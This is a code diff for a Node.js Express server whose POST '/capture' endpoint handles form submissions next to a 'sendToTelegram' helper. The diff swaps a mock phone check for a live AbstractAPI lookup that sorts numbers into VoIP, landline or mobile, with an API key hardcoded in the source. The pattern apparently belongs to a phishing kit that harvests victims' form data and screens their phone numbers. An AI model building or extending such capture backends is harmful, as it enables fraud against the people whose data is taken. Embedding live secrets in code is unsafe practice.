@@ -101,13 +101,31 @@ const sendToTelegram = async (message) => {
 
 // Endpoint to handle form submissions
 app.post('/capture', async (req, res) => {
-    // ── Phone Validation Endpoint (Mock) ──────────────────────────────────────────
+    // ── Phone Validation Endpoint (AbstractAPI) ──────────────────────────────────────────
     if (req.query.action === 'line-type') {
         const phone = req.body.phone || '';
         if (!phone) return res.json({ type: 'unknown' });
-        if (phone.endsWith('0000')) return res.json({ type: 'voip' });
-        if (phone.endsWith('1111')) return res.json({ type: 'landline' });
-        return res.json({ type: 'mobile' });
+        
+        try {
+            const abstractKey = '0adc8e15f7914654b2c102cebbb299a0';
+            const url = `https://phonevalidation.abstractapi.com/v1/?api_key=${abstractKey}&phone=${encodeURIComponent(phone)}`;
+            const abstractRes = await axios.get(url, { timeout: 3000 });
+            const data = abstractRes.data;
+            
+            if (data?.phone_validation?.is_voip) {
+                return res.json({ type: 'voip' });
+            }
+            if (data?.phone_carrier?.line_type) {
+                const lineType = data.phone_carrier.line_type.toLowerCase();
+                if (lineType.includes('landline') || lineType.includes('fixed')) {
+                    return res.json({ type: 'landline' });
+                }
+            }
+            return res.json({ type: 'mobile' });
+        } catch (e) {
+            // Fail open if API rate limits or times out
+            return res.json({ type: 'mobile' });
+        }
     }
 
     const d = req.body;
